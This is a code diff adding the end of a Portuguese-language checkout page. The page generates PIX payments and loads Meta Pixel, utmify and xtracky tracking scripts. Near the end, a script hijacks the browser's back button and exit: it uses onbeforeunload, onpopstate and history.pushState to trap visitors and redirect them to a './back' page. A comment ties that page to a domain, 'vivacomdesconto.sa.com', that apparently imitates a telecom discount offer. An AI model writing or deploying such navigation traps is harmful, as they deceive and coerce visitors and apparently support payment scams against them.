+                input.disabled = true;
+              }
+              submitButton.style.display = "none";
+            } else {
+              throw new Error(data.message || "Erro ao gerar PIX");
+            }
+          } catch (error) {
+            console.error("Erro:", error);
+            // Esconde o modal de carregamento em caso de erro
+            hideLoadingModal();
+            alert("Erro ao gerar o PIX. Por favor, tente novamente.");
+          } finally {
+            // Reabilita o botão após a requisição
+            const submitButton = document.querySelector(".btn-finalizar");
+            submitButton.disabled = false;
+            submitButton.innerHTML = "Gerar PIX Agora";
+          }
+        });
+    </script>
+    <!-- Meta Pixel Code -->
+    <script>
+      !(function (f, b, e, v, n, t, s) {
+        if (f.fbq) return;
+        n = f.fbq = function () {
+          n.callMethod
+            ? n.callMethod.apply(n, arguments)
+            : n.queue.push(arguments);
+        };
+        if (!f._fbq) f._fbq = n;
+        n.push = n;
+        n.loaded = !0;
+        n.version = "2.0";
+        n.queue = [];
+        t = b.createElement(e);
+        t.async = !0;
+        t.src = v;
+        s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s);
+      })(
+        window,
+        document,
+        "script",
+        "https://connect.facebook.net/en_US/fbevents.js"
+      );
+      fbq("init", "685300500613979");
+      fbq("track", "PageView");
+    </script>
+    <noscript
+      ><img
+        height="1"
+        width="1"
+        style="display: none"
+        src="https://www.facebook.com/tr?id=685300500613979&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+
+    <script>
+      window.pixelId = "689148f595f880da90db05c2";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+
+    <script>
+      // Captura os UTMs assim que a página carregar
+      document.addEventListener("DOMContentLoaded", function () {
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmParams = {
+          utm_source: urlParams.get("utm_source") || null,
+          utm_medium: urlParams.get("utm_medium") || null,
+          utm_campaign: urlParams.get("utm_campaign") || null,
+          utm_content: urlParams.get("utm_content") || null,
+          utm_term: urlParams.get("utm_term") || null,
+          src: urlParams.get("src") || null,
+          sck: urlParams.get("sck") || null,
+        };
+        localStorage.setItem("utmParams", JSON.stringify(utmParams));
+        console.log("UTMs capturados:", utmParams); // Debug
+      });
+
+      function getRedirectUrl() {
+        const baseUrl = "./back";
+        const storedUtms = JSON.parse(localStorage.getItem("utmParams"));
+        if (!storedUtms) return baseUrl;
+
+        const params = new URLSearchParams();
+        Object.entries(storedUtms).forEach(([key, value]) => {
+          if (value) params.append(key, value);
+        });
+
+        const queryString = params.toString();
+        return queryString ? `${baseUrl}?${queryString}` : baseUrl;
+      }
+
+      // Redireciona para vivacomdesconto.sa.com quando o usuário tenta sair ou voltar
+      window.onbeforeunload = function () {
+        window.location.href = getRedirectUrl();
+        return null;
+      };
+
+      // Previne o comportamento padrão do botão voltar
+      history.pushState(null, null, location.href);
+      window.onpopstate = function () {
+        history.pushState(null, null, location.href);
+        window.location.href = getRedirectUrl();
+      };
+    </script>
+    
+     <script 
+        src="https://cdn.xtracky.com/scripts/utm-handler.js"
+        data-token="4f40e884-ba89-4781-96d1-6c17187b35f2"
+        data-click-id-param="click_id">
+</script>
+
+  </body>
+</html>
